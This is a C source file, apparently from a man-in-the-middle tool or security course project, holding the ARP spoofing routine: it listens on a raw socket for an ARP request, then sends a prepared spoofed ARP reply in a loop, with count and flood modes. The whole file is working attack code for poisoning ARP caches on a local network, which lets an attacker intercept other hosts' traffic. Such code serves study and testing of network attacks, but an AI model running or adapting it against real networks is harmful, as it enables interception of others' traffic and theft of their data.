#include "../includes/mitm.h"

static void		receiving_arp_request(t_env *env)
{
	struct s_arphdr	*arp;
	socklen_t		salen;

	salen = sizeof(struct sockaddr_ll);
	if (recvfrom(env->socketfd, env->recvbuf, MTU, 0, (struct sockaddr*)&env->sa_rcv, &salen) == -1)
		exit_error("Recvfrom error");
	arp = (struct s_arphdr*)(env->recvbuf + sizeof(struct ethhdr));
	if (env->flags & FL_VERBOSE)
	{
		printf("\nARP Packet receive:");
		print_arp(arp);
	} else
		printf("An ARP request has been broadcast.\n");

	if (ntohs(arp->op) != ARPOP_REQUEST)
		receiving_arp_request(env);
}

static bool		condition_loop(t_env *env)
{
	if (env->flags & FL_FLOOD)
		return true;
	return env->count ? true : false;
}

void			arp_spoof(t_env *env)
{
	printf("Waiting for ARP request ...\n");
	receiving_arp_request(env);
	while (condition_loop(env))
	{
		if (can_send)
		{
			if (sendto(env->socketfd, env->sendbuf, ARP_SIZE, 0, (struct sockaddr*)&env->sa,
				sizeof(struct sockaddr_ll)) == -1)
				exit_error("Sendto error");
			if (env->flags & FL_VERBOSE)
			{
				printf("\nARP Packet send:");
				print_arp(env->arp);
			} else
				printf("Spoofed ARP Reply sent\n");
			if (env->flags & FL_COUNT || env->flags & FL_FLOOD)
				alarm(env->interval);
			can_send = 0;
			env->count--;
		}
	}
}